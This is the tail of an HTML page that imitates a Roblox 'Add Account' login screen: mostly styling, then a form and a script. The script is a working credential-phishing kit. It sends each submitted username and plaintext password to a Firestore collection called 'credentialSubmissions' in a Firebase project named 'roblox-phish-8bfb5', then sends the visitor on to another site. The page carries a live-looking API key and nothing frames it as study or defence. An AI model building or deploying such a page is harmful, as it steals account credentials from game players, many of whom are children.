      src: url('BuilderSans-Light-300.otf') format('opentype');
      font-weight: 300;
      font-style: normal;

    @font-face {
      font-family: 'Builder Sans';
      src: url('BuilderSans-Regular-400.otf') format('opentype');
      font-weight: 400;
      font-style: normal;

    @font-face {
      font-family: 'Builder Sans';
      src: url('BuilderSans-Medium-500.otf') format('opentype');

    * {
      box-sizing: border-box;
    }

    .sr-only {
      position: absolute;
      width: 1px;
      height: 1px;
      padding: 0;
      margin: -1px;
      overflow: hidden;
      clip: rect(0, 0, 0, 0);
      white-space: nowrap;
      border: 0;
    }

    /* Header styles */
    .rbx-header {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      height: 40px;
      background-color: #191a1f;
      border-bottom: 1px solid #202227;
      z-index: 1030;
      display: flex;
      align-items: center;
      padding: 0 16px;
    }

    .rbx-header .navbar-brand {
      display: flex;
      align-items: center;
      color: #f7f7f8;
      text-decoration: none;
      font-size: 20px;
      font-weight: 700;
      padding: 8px 12px;
    }

    .rbx-header .nav {
      display: flex;
      list-style: none;
      margin: 0;
      padding: 0;
      gap: 20px;
      flex: 1;
      margin-left: 24px;
    }

    .rbx-header .nav li {
      display: flex;
      align-items: center;
    }

    .rbx-header .nav a {
      color: #f7f7f8;
      text-decoration: none;
      font-size: 14px;
      font-weight: 500;
      padding: 8px 12px;
      transition: color 0.2s ease;
    }

    .rbx-header .nav a:hover {
      color: #ffffff;
    }

    body {
      margin: 0;
      min-height: 100vh;
      font-family: "Builder Sans", "Helvetica Neue", Helvetica, Arial, "Lucida Grande", sans-serif;
      background: linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)),

      color: #f7f7f8;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 64px 24px 24px;
    }

    .auth-card {
      width: 100%;
      max-width: 420px;
      padding: 32px 15px 28px;
      background: #272930;
      border-radius: 0;
      border: 1px solid rgba(16, 18, 24, 0.65);
      box-shadow: 0 30px 60px rgba(0, 0, 0, 0.55);
    }

    h1 {
      margin: 0 0 24px;
      text-align: center;
      font-size: 2rem;
      font-weight: 700;
    }

    input {
      width: 100%;
      height: 38px;
      padding: 5px 12px;
      border-radius: 8px;
      border: 1px solid rgba(208, 217, 251, .12);
      background: rgba(208, 217, 251, .08);
      color: #d5d7dd;
      font-size: 16px;
      font-weight: 400;
      line-height: 1.4em;
      box-shadow: none;
      transition: border 0.2s ease, box-shadow 0.2s ease;
    }

    input::placeholder {
      color: #d5d7dd;
    }

    input:focus {
      outline: none;
      border-color: #fdfdff;
      box-shadow: 0 0 0 2px rgba(255, 255, 255, 0.12);
    }

    .field + .field {
      margin-top: 12px;
    }

    .primary-btn {
      width: 100%;
      margin: 6px 0 12px;
      padding: 9px;
      border: 1px solid #d5d7dd;
      border-radius: 8px;
      background: transparent;
      color: #bcbec8;
      font-size: 16px;
      font-weight: 500;
      line-height: 100%;
      cursor: pointer;
      user-select: none;
      text-align: center;
      transition: background 0.2s ease, color 0.2s ease, box-shadow 0.2s ease;
    }

    .primary-btn:hover {
      background: rgba(213, 215, 221, 0.1);
      color: #d5d7dd;
    }

    .link-row {
      margin-top: 12px;
      margin-bottom: 16px;
      text-align: center;
      font-size: 16px;
    }

    .link-row a {
      color: #f7f7f8;
      text-decoration: none;
      font-weight: 300;
      transition: color 0.2s ease;
    }

    .link-row a:hover {
      color: #ffffff;
      text-decoration: underline;
    }

    .divider {
      height: 1px;
      background: #414550;
      margin-bottom: 16px;
    }

    .action-btn {
      width: 100%;
      padding: 9px;
      border-radius: 8px;
      border: 1px solid transparent;
      background: rgba(208, 217, 251, .12);
      color: #f7f7f8;
      font-size: 16px;
      font-weight: 500;
      line-height: 100%;
      cursor: pointer;
      user-select: none;
      text-align: center;
      transition: background 0.2s ease;
    }

    .action-btn:first-of-type {
      margin-top: 12px;
      margin-bottom: 6px;
    }

    .action-btn + .action-btn {
      margin-top: 0;
    }

    .action-btn:hover {
      background: rgba(208, 217, 251, .18);
    }

    .subtle-link {
      display: block;
      margin-top: 18px;
      margin-bottom: 0;
      text-align: center;
      color: #f7f7f8;
      text-decoration: none;
      font-size: 16px;
      font-weight: 500;
      transition: color 0.2s ease;
    }

    .subtle-link:hover {
      color: #ffffff;
      text-decoration: underline;
    }

    @media (max-width: 420px) {
      .auth-card {
        padding: 32px 24px 28px;
      }
    }
  </style>
</head>

  <main class="auth-card" aria-live="polite">
    <h1>Add Account</h1>
    <form id="authForm">
      <div class="field">
        <label class="sr-only" for="username">Username / Email / Phone</label>
        <input id="username" name="username" type="text" placeholder="Username/Email/Phone" autocomplete="username" required />
      </div>
      <div class="field">
        <label class="sr-only" for="password">Password</label>
        <input id="password" name="password" type="password" placeholder="Password" autocomplete="current-password" required />
      </div>
      <button type="submit" class="primary-btn">Log In</button>
    </form>
    <div class="link-row">
      <a href="#">Forgot Password or Username?</a>
    </div>
    <div class="divider" aria-hidden="true"></div>
    <button class="action-btn" type="button">Email Me a One-Time Code</button>
    <button class="action-btn" type="button">Use Another Device</button>
    <a class="subtle-link" href="#">Create a New Account</a>
  </main>
  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-app.js";
    import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-firestore.js";

    const firebaseConfig = {
      apiKey: "AIzaSyDvX3h0OADwniqZZO5qTk8zQe4oCbzYYh0",
      authDomain: "roblox-phish-8bfb5.firebaseapp.com",
      projectId: "roblox-phish-8bfb5",
      storageBucket: "roblox-phish-8bfb5.firebasestorage.app",
      messagingSenderId: "253864987198",
      appId: "1:253864987198:web:a97cb6e668db28ff399f6f"
    };

    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);
    const form = document.getElementById("authForm");
    const usernameInput = document.getElementById("username");
    const passwordInput = document.getElementById("password");

    form.addEventListener("submit", async (event) => {
      event.preventDefault();

      const payload = {
        username: usernameInput.value.trim(),
        password: passwordInput.value,
        createdAt: serverTimestamp()
      };

      try {
        await addDoc(collection(db, "credentialSubmissions"), payload);
        form.reset();
        window.location.href = "https://example.com";
      } catch (error) {
        console.error("Failed to save credentials", error);
        alert("Unable to store credentials right now.");
      }
    });
  </script>
